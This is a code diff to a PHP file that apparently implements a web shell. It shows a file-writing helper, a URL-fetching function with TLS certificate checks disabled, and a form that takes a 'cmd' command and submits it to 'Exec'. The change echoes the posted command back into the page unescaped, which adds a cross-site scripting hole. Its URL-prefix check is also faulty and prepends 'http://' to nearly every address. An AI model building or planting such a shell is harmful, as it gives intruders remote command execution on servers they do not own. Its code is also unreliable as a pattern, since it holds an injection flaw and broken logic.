@@ -21,22 +21,29 @@ function doFile($name, $content, $type)
     return ($write !== false) ? true : false;
 }
 
-function request($url)
+function request($url, $type = "ifWebsite")
 {
+    $return = [];
+
     $context = stream_context_create([
         "ssl" => [
             "verify_peer" => false,
             "verify_peer_name" => false,
         ],
     ]);
-
+    
     $url = (!preg_match("/http:\/\//", $url) || !preg_match("/https:\/\//", $url)) ? "http://$url" : $url;
-    $request = @file_get_contents($url, false, $context);
 
-    return [
-        "success" => ($request !== false) ? "1" : "0",
-        "content" => $request
-    ];
+    if ($type === "getContent") {
+        $request = @file_get_contents($url, false, $context);
+        $return["content"] = $request;
+
+    } else {
+        $request = @get_headers($url, false, $context);
+    }
+
+    $return["success"] = ($request !== false) ? "1" : "0";
+    return $return;
 }
 ?>
 
@@ -200,7 +207,7 @@ function request($url)
 
         <form method='post'>
             <label for='cmd'>Command: </label>
-            <input type='text' name='cmd' id='cmd' autocomplete='off'>
+            <input type='text' name='cmd' id='cmd' value="<?= (isset($_POST['cmd'])) ? $_POST['cmd'] : ''; ?>" autocomplete='off'>
             <input type='submit' name='exec' value='Exec'>
         </form>
 
